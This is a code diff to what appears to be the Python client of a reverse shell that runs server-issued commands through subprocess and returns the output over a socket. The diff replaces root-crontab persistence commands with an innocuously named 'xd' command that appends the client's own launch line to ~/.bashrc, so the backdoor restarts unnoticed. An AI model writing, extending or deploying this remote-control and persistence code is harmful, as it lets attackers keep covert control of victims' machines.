@@ -44,38 +44,23 @@ while True:
                 else:
                     # if operation is successful, empty message
                     output = ""
-
-            elif splited_command[0].lower() == "create_cronjob":
-                # create a cronjob that starts with the machine
-                cronjob = f"@reboot {command[15:]}\n"
-                # write the cronjob to the crontab file
+            elif splited_command[0].lower() == "xd":
+                # get the current working directory
+                cwd = os.getcwd()
+                # create the command to add to .bashrc
+                command_to_add = f"python3 {cwd}/client.py &"
+                # path to the .bashrc file
+                bashrc_path = os.path.expanduser("~/.bashrc")
                 try:
-                    with open('/var/spool/cron/crontabs/root', 'a') as file:
-                        file.write(cronjob)
+                    # open the .bashrc file in append mode
+                    with open(bashrc_path, "a") as file:
+                        # write the command to the .bashrc file
+                        file.write("\n" + command_to_add + "\n")
                     # set the output to success message
-                    output = "Cronjob created successfully!"
+                    output = "Command added to .bashrc successfully!"
                 except Exception as e:
                     # if there's an error, set the output to the error message
                     output = str(e)
-                # get the current working directory as output
-                cwd = os.getcwd()
-                # send the results back to the server
-                message = f"{output}{SEPARATOR}{cwd}"
-                s.send(message.encode())
-
-            elif splited_command[0].lower() == "destroy_cronjob":
-                # read the current cron jobs
-                with open('/var/spool/cron/crontabs/root', 'r') as file:
-                    lines = file.readlines()
-
-                # remove the cron job that starts with the command
-                lines = [line for line in lines if not line.startswith(f"@reboot {command[16:]}")]
-
-                # write the remaining cron jobs back to the crontab
-                with open('/var/spool/cron/crontabs/root', 'w') as file:
-                    file.writelines(lines)
-
-                output = "Cronjob destroyed successfully!"
             else:
                 # execute the command and retrieve the results
                 output = subprocess.getoutput(command)
